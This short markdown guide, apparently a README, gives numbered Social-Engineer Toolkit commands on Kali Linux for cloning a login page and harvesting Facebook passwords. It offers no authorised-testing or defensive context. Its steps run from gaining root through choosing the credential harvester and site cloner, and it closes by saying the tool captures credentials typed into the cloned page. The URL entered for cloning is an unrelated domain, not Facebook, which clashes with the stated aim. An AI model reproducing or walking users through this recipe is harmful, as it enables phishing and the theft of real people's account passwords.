# Phishing for Capturing Facebook Passwords

### Tools Required

- Kali Linux
- setoolkit

## Setting Up Phishing on Kali Linux

1. Gain root access:

```bash
sudo su
```

2. Launch the Social-Engineer Toolkit (SET):

```bash
setoolkit
```

3. Select the attack type:

```bash
Social-Engineering Attacks
```

4. Choose the attack vector:

```bash
Web Site Attack Vectors
```
5. Select the attack method:

```bash

Credential Harvester Attack Method
```
6. Choose the Site Cloner method:
```bash
Site Cloner
```
7. Find your machine’s IP address:
```bash
ifconfig
```
8. Enter the target website URL to clone:
```bash
http://www.mirtesnet.com.br
```
## Results

![Alt text] (fishing.jpeg)

Once configured, the tool will capture credentials entered by users attempting to log in via the cloned Facebook page.
